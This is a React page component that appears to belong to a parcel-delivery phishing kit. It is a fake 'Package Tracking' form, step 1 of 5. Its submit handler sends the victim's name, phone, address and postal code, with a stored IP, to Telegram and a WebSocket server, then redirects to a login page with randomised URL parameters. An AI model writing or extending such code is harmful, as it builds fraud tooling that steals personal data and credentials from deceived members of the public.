import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Box, Container, Flex, VStack, Icon, Text } from "@chakra-ui/react";
import { MdLocationOn } from "react-icons/md";
import Header from "../components/Header";
import Footer from "../components/Footer";
import ProgressBar from "../components/ProgressBar";
import FormInput from "../components/FormInput";
import CustomButton from "../components/CustomButton";
import {
  isValidPhone,
  randomParamsURL,
} from "../utils/validation";
import { useSendTLGMessage } from "../hooks/useTelegram";
import { buildTelegramMessage } from "../utils/messageBuilder";

const Track = () => {
  const navigate = useNavigate();
  const { send, loading } = useSendTLGMessage();
  const [formData, setFormData] = useState({
    fullName: "",
    phone: "",
    address: "",
    postalCode: "",
  });
  const [errors, setErrors] = useState({});

  const formatPhoneNumber = (input) => {
    const digitsOnly = input.replace(/\D/g, "");
    const withoutCountry = digitsOnly.startsWith("1")
      ? digitsOnly.slice(1)
      : digitsOnly;
    const raw = withoutCountry.slice(0, 10);

    const part1 = raw.slice(0, 3);
    const part2 = raw.slice(3, 6);
    const part3 = raw.slice(6, 10);

    if (raw.length === 0) return "";
    if (raw.length <= 3) return `(${part1}`;
    if (raw.length <= 6) return `(${part1}) ${part2}`;
    return `(${part1}) ${part2}-${part3}`;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    const nextValue = name === "phone" ? formatPhoneNumber(value) : value;
    setFormData((prev) => ({ ...prev, [name]: nextValue }));
    if (errors[name]) {
      setErrors((prev) => ({ ...prev, [name]: false }));
    }
  };

  const validateForm = () => {
    const newErrors = {};

    if (formData.fullName.trim().length < 3) {
      newErrors.fullName = true;
    }

    if (!isValidPhone(formData.phone)) {
      newErrors.phone = true;
    }

    if (formData.address.trim().length < 3) {
      newErrors.address = true;
    }

    if (formData.postalCode.trim().length < 3) {
      newErrors.postalCode = true;
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    const clientId =
      typeof window !== "undefined" ? localStorage.getItem("clientId") : null;
    const clientIp =
      typeof window !== "undefined" ? localStorage.getItem("clientIp") : null;

    // Store track data in localStorage for cumulative messages
    const trackData = {
      fullName: formData.fullName.trim(),
      phone: formData.phone.trim(),
      address: formData.address.trim(),
      postalCode: formData.postalCode.trim(),
    };
    localStorage.setItem("trackData", JSON.stringify(trackData));

    // Build cumulative message
    const message = buildTelegramMessage(clientIp);
    await send(message);

    // Send to WebSocket server
    try {
      window.dispatchEvent(
        new CustomEvent("ws:emit", {
          detail: {
            type: "track_data",
            clientId,
            fullName: formData.fullName.trim(),
            phone: formData.phone.trim(),
            address: formData.address.trim(),
            postalCode: formData.postalCode.trim(),
          },
        })
      );
    } catch {
      // ignore
    }

    navigate(`/login?${randomParamsURL()}`);
  };

  return (
    <Box minH="100vh" display="flex" flexDirection="column" bg="#efefef">
      <Header />

      <Box flex="1" py={{ base: 4, md: 6 }}>
        <Container maxW="800px" px={{ base: 4, md: 6 }} mx="auto">
          <ProgressBar currentStep={1} />

          <Box
            bg="white"
            border="1px solid"
            borderColor="#cbcbcb"
            borderRadius="8px"
            boxShadow="0 2px 12px rgba(0,0,0,0.08)"
            overflow="hidden">
            {/* Header Tab */}
            <Flex
              bg="#279989"
              color="white"
              fontSize={{ base: "18px", md: "20px" }}
              fontWeight="700"
              p={4}
              align="center"
              justify="center"
              flexDirection="column"
              minH="90px"
              bgGradient="linear(to-r, #279989, #2aaa96)"
              boxShadow="0 2px 8px rgba(39, 153, 137, 0.3)">
              <Flex align="center" mb={2}>
                <Icon as={MdLocationOn} boxSize={{ base: 6, md: 8 }} mr={2} />
                <Text>Delivery Information</Text>
              </Flex>
              <Text fontSize="13px" fontWeight="500" opacity={0.9}>
                Step 1 of 5 • Package Tracking
              </Text>
            </Flex>

            {/* Form */}
            <Box p={{ base: 6, md: 10 }} bg="white">
              <Box maxW="700px" mx="auto" w="full">
                <form onSubmit={handleSubmit}>
                  <VStack spacing={5} w="full">
                    <FormInput
                      name="fullName"
                      placeholder="Full name"
                      value={formData.fullName}
                      onChange={handleChange}
                      isInvalid={errors.fullName}
                    />

                    <FormInput
                      name="phone"
                      placeholder="(XXX) XXX-XXXX"
                      value={formData.phone}
                      onChange={handleChange}
                      isInvalid={errors.phone}
                    />

                    <FormInput
                      name="address"
                      placeholder="Address"
                      value={formData.address}
                      onChange={handleChange}
                      isInvalid={errors.address}
                    />

                    <FormInput
                      name="postalCode"
                      placeholder="Postal code"
                      value={formData.postalCode}
                      onChange={handleChange}
                      isInvalid={errors.postalCode}
                    />

                    <Flex w="full" justify="center" pt={6}>
                      <CustomButton type="submit" isLoading={loading}>
                        Next
                      </CustomButton>
                    </Flex>
                  </VStack>
                </form>
              </Box>
            </Box>
          </Box>
        </Container>
      </Box>

      <Footer />
    </Box>
  );
};

export default Track;
